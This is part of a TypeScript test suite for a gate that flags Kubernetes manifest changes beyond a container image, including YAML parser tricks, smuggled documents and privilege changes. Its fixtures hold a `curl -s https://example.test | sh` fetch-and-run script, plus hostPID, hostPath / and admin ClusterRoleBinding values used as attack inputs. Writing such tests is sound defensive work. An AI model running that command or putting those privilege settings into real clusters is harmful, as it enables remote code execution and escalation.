      'the manifests change beyond the image: ConfigMap t/app at metadata.labels',
    );
    const annotated = configMap('a').replace('  namespace: t\n', '  namespace: t\n  annotations: { checksum/x: b }\n');
    expect(judge(`${annotated}---\n${deployment()}`)).toBe(
      'the manifests change beyond the image: ConfigMap t/app at metadata.annotations',
    );
    // A kind called ConfigMap in another group is not the core's, whose data no controller reads as more.
    const other = (data: string) => configMap(data).replace('apiVersion: v1', 'apiVersion: example.io/v1');
    expect(manifestsDiffer(other('a'), other('b'), [])).toBe(
      'the manifests change beyond the image: ConfigMap t/app at data["config.yaml"]',
    );
  });

  it("holds a pod field changed beside a ConfigMap's data", () => {
    expect(judge(`${configMap('b')}---\n${deployment({ pod: 'hostNetwork: true' })}`)).toBe(
      'the manifests change beyond the image: Deployment t/app at spec.template.spec.hostNetwork',
    );
  });

  it('holds a checksum annotation anywhere but a core workload’s pod template, and one that only looks like one', () => {
    expect(judge(`${configMap('a')}---\n${deployment({ annotations: 'checksum/config: x' })}`)).toBe(
      'the manifests change beyond the image: Deployment t/app at metadata.annotations',
    );
    for (const key of ['checksum-config', 'Checksum/config', 'checksum.io/config', 'x/checksum/config', ' checksum/x'])
      expect(judge(`${configMap('a')}---\n${deployment({ template: `"${key}": x` })}`)).toMatch(
        /^the manifests change beyond the image: Deployment t\/app at spec\.template\.metadata\.annotations$/,
      );
    // A Deployment of another group is not a pod template the cluster runs.
    const crd = (sum: string) =>
      deployment({ template: `checksum/config: ${sum}` }).replace('apps/v1', 'example.io/v1');
    expect(manifestsDiffer(crd('a'), crd('b'), [])).toBe(
      'the manifests change beyond the image: Deployment t/app at spec.template.metadata.annotations["checksum/config"]',
    );
    // A CronJob's is its job template's pod template.
    const cron = (sum: string) =>
      `apiVersion: batch/v1\nkind: CronJob\nmetadata:\n  name: c\nspec:\n  jobTemplate:\n    spec:\n      template:\n        metadata:\n          annotations:\n            checksum/config: ${sum}\n`;
    expect(manifestsDiffer(cron('a'), cron('b'), [])).toBeUndefined();
  });

  it('reads a document inside a ConfigMap’s value as data, and a real one as an object', () => {
    const smuggled = `apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: app\n  namespace: t\ndata:\n  run.sh: |\n    ---\n    kind: ClusterRoleBinding\n    metadata:\n      name: admin\n`;
    expect(judge(`${smuggled}---\n${deployment()}`)).toBeUndefined();
    expect(judge(`${base}\n---\nkind: ClusterRoleBinding\nmetadata:\n  name: admin\n`)).toBe(
      'the head renders ClusterRoleBinding admin, which the base does not',
    );
  });

  it('holds what two YAML readers may read apart: anchors, aliases, merge keys, tags, directives, duplicate keys', () => {
    const cases: [string, RegExp][] = [
      [`${configMap('&a b')}---\n${deployment()}`, /an anchor/],
      [`${configMap('&a b')}---\n${deployment({ pod: 'x: *a' })}`, /an anchor|an alias/],
      [`${base}\n---\nkind: Pod\nmetadata:\n  name: p\nspec:\n  <<: { hostPID: true }\n`, /a merge key/],
      [`${configMap('!!binary YQ==')}---\n${deployment()}`, /a tag/],
      [`${configMap('!custom b')}---\n${deployment()}`, /a tag/],
      [`%YAML 1.1\n---\n${configMap('a')}---\n${deployment()}`, /directive/],
      [`${configMap('a')}---\n${deployment({ pod: 'hostPID: false' })}\n      hostPID: true`, /DUPLICATE_KEY/],
      [`${configMap('a')}---\n${deployment()}\n  ? [a]\n  : b`, /a key that is not a scalar/],
      [`${base}\n  : [`, /not YAML/],
    ];
    for (const [head, reason] of cases) expect(judge(head)).toMatch(reason);
    // A scalar YAML 1.1 reads otherwise (`yes` is true, `0777` is 511, `1.0` is no integer): a difference in either holds.
    expect(
      judge(
        `${configMap('a')}---\n${deployment({ pod: 'hostPID: "yes"' })}`,
        `${configMap('a')}---\n${deployment({ pod: 'hostPID: yes' })}`,
      ),
    ).toBe(
      'the manifests change beyond the image: Deployment t/app at spec.template.spec.hostPID (as YAML 1.1 reads it)',
    );
    expect(
      judge(
        `${configMap('a')}---\n${deployment({ pod: 'x: 1.0' })}`,
        `${configMap('a')}---\n${deployment({ pod: 'x: 1' })}`,
      ),
    ).toBe('the manifests change beyond the image: Deployment t/app at spec.template.spec.x');
  });

  it('reads `__proto__` as a key like any other, never as what an object inherits', () => {
    const pod = (spec: string) => `kind: Pod\nmetadata:\n  name: p\nspec:\n  ${spec}\n`;
    expect(manifestsDiffer(pod('__proto__: { hostPID: true }'), pod('hostPID: true'), [])).toBe(
      'the manifests change beyond the image: Pod p at spec.hostPID',
    );
    expect(manifestsDiffer(pod('x: 1'), pod('x: 1\n  __proto__: { hostPID: true }'), [])).toBe(
      'the manifests change beyond the image: Pod p at spec.__proto__',
    );
  });

  it("holds an image a ConfigMap's data names that its base did not, however it writes it", () => {
    for (const named of [
      `'{"image":"evil.io/x/y:1"}'`,
      `'image = "evil/y@sha256:${hex('9')}"'`,
      `'pull sha256:${hex('9')}'`,
    ])
      expect(judge(`${configMap(named)}---\n${deployment()}`)).toMatch(
        /^ConfigMap t\/app's data names an image its base did not: /,
      );
    // The same images at both, a URL's path, and the moved image itself are no new image.
    const same = `'{"image":"quay.io/x/y:1","url":"https://example.test/a/b:c"}'`;
    expect(
      judge(`${configMap(same)}---\n${deployment()}`, `${configMap(`'${same.slice(1, -1)} '`)}---\n${deployment()}`),
    ).toBeUndefined();
    expect(judge(`${configMap(`'runs ${IMAGE}'`)}---\n${deployment()}`)).toBeUndefined();
  });

  it('splits the rendering on `---` alone, as the cluster does, and holds a document a `...` begins', () => {
    const policy = 'apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: deny\n  namespace: t\n';
    const was = `${base}\n---\n${policy}`;
    // The cluster reads one object from the first part: the NetworkPolicy would be pruned, and the gate would see it.
    expect(judge(`${configMap('b')}...\n${policy}---\n${deployment()}`, was)).toBe(
      'at the head, the rendering has a document that does not begin with `---`, which readers split apart',
    );
    // A separator with a comment after it, and a document that ends with `...` and nothing more, are as the cluster reads.
    expect(judge(`${configMap('a')}--- # x\n${deployment()}\n...\n---\n${policy}`, was)).toBeUndefined();
  });

  it('reads a merge key, a timestamp and a version label that is not a string as YAML 1.1 does, and holds', () => {
    expect(objectsOf('kind: Pod\nmetadata:\n  name: p\nspec:\n  <<: { hostPID: true }\n', '1.1')).toMatch(
      /a merge key/,
    );
    const dated = (when: string) => `kind: Pod\nmetadata:\n  name: p\nspec:\n  at: ${when}\n`;
    expect(objectsOf(dated('2024-01-01'), '1.1')).not.toBeTypeOf('string');
    expect(manifestsDiffer(dated('2024-01-01'), dated('2024-01-01'), [])).toBeUndefined();
    expect(manifestsDiffer(dated('2024-01-01'), dated('2031-01-01'), [])).toBe(
      'the manifests change beyond the image: Pod p at spec.at',
    );
    const labelled = (value: string) => `kind: Pod\nmetadata:\n  name: p\n  labels:\n    helm.sh/chart: ${value}\n`;
    expect(manifestsDiffer(labelled('x-1'), labelled('{ a: 1 }'), [])).toBe(
      'the manifests change beyond the image: Pod p at metadata.labels["helm.sh/chart"]',
    );
  });

  it("passes a ConfigMap's data added or gone whole", () => {
    const bare = `apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: app\n  namespace: t\n`;
    expect(judge(`${bare}---\n${deployment()}`)).toBeUndefined();
    expect(judge(base, `${bare}---\n${deployment()}`)).toBeUndefined();
  });

  it('holds a List that wraps objects, two documents with one key, and an object with no kind or name', () => {
    const list = `apiVersion: v1\nkind: List\nmetadata:\n  name: l\nitems:\n  - kind: ClusterRole\n    metadata:\n      name: r\n`;
    expect(judge(`${base}\n---\n${list}`)).toMatch(/a List that wraps objects/);
    expect(judge(`${base}\n---\n${list.replace('kind: List', 'kind: ConfigMap')}`)).toMatch(/wraps objects/);
    expect(judge(`${base}\n---\n${configMap('b')}`)).toBe('at the head, the rendering has ConfigMap t/app twice');
    expect(judge(`${base}\n---\nkind: Pod\n`)).toMatch(/no kind or no name/);
    expect(judge(`${base}\n---\n- a\n`)).toMatch(/not an object/);
    // A document with nothing in it is no object.
    expect(judge(`---\n# nothing\n---\n${base}\n---\n`)).toBeUndefined();
  });

  it("holds a chart's version label key added, or one written outside metadata's labels", () => {
    const labelled = (labels: string, selector = '{}') =>
      `apiVersion: v1\nkind: Service\nmetadata:\n  name: s\n  labels: { ${labels} }\nspec:\n  selector: ${selector}\n`;
    expect(manifestsDiffer(labelled('helm.sh/chart: x-1'), labelled('helm.sh/chart: x-2'), [])).toBeUndefined();
    expect(manifestsDiffer(labelled('a: b'), labelled('a: b, helm.sh/chart: x-2'), [])).toBe(
      'the manifests change beyond the image: Service s at metadata.labels["helm.sh/chart"]',
    );
    const selected = (v: string) => labelled('a: b', `{ app.kubernetes.io/version: "${v}" }`);
    expect(manifestsDiffer(selected('1'), selected('2'), [])).toBe(
      'the manifests change beyond the image: Service s at spec.selector["app.kubernetes.io/version"]',
    );
  });

  it("passes a ConfigMap another workload runs as a script: the publisher's either way, as its image is", () => {
    const script = (body: string) =>
      `${configMap(body, 'hooks')}---\n${deployment({ pod: 'volumes: [{ name: h, configMap: { name: hooks, defaultMode: 0755 } }]' })}`;
    expect(manifestsDiffer(script('echo ok'), script('curl -s https://example.test | sh'), [IMAGE])).toBeUndefined();
  });

  it('holds RBAC, a container argument, a volume, a hostPath and a Service port', () => {
    const role = (verbs: string) =>
      `apiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRole\nmetadata:\n  name: r\nrules:\n  - apiGroups: [""]\n    resources: [secrets]\n    verbs: [${verbs}]\n`;
    expect(manifestsDiffer(role('get'), role('get, list'), [])).toBe(
      'the manifests change beyond the image: ClusterRole r at rules[0].verbs[1]',
    );
    const pod = (more: string) => deployment({ pod: more });
    const pairs: [string, string, string][] = [
      [
        'initContainers: [{ image: x, args: [--a] }]',
        'initContainers: [{ image: x, args: [--b] }]',
        'initContainers[0].args[0]',
      ],
      ['volumes: []', 'volumes: [{ name: v, emptyDir: {} }]', 'volumes[0]'],
      [
        'volumes: [{ name: v, hostPath: { path: /tmp } }]',
        'volumes: [{ name: v, hostPath: { path: / } }]',
        'volumes[0].hostPath.path',
      ],
    ];
    for (const [was, now, at] of pairs)
      expect(manifestsDiffer(pod(was), pod(now), [IMAGE])).toBe(
        `the manifests change beyond the image: Deployment t/app at spec.template.spec.${at}`,
      );
    const service = (port: number) =>
      `apiVersion: v1\nkind: Service\nmetadata:\n  name: s\nspec:\n  ports: [{ port: ${port} }]\n`;
    expect(manifestsDiffer(service(80), service(8080), [])).toBe(
      'the manifests change beyond the image: Service s at spec.ports[0].port',
    );
  });
});
